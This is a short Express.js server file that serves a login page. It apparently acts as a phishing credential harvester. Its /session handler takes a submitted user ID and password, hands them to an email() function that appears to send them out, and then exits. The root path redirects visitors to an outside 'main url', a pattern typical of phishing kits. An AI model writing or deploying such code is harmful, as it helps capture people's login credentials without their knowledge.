require('dotenv').config({ path: "./src/key/.env" });

const express = require('express');
const { email } = require('./src/email/email');
const app = express();
const path = require('path');
const port = 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.set('view engine', 'html');
app.set('views', path.join(__dirname, 'src', 'html'));
app.use(express.static(path.join(__dirname, 'src', 'public')));
app.use(express.static(path.join(__dirname, 'src', 'html')));

app.route('/login')
    .get((req, res) => {
        res.sendFile(path.join(__dirname, "src", 'html', 'login.html'))
    })
    .post((req, res) => {
    })

app.route('/session')
    .get((req, res) => {
        return res.redirect('/login')
    })
    .post(async (req, res) => {
        try {
            const userID = req.body.id.toLowerCase();
            const userPassword = req.body.userPassword;

            const EmailInfo = await email(userID, userPassword);
            if (EmailInfo) return process.exit();
        } catch (error) {
            console.error('Error:', error);
            res.status(500).send('Failed to send email');
        }

    })

app.get('/', (req, res) => {
    res.redirect('https://example.com'); //main url
});

const server = app.listen(port, '0.0.0.0', () => {
    const port = server.address().port;
    console.log(`Server is running on port ${port}`);
});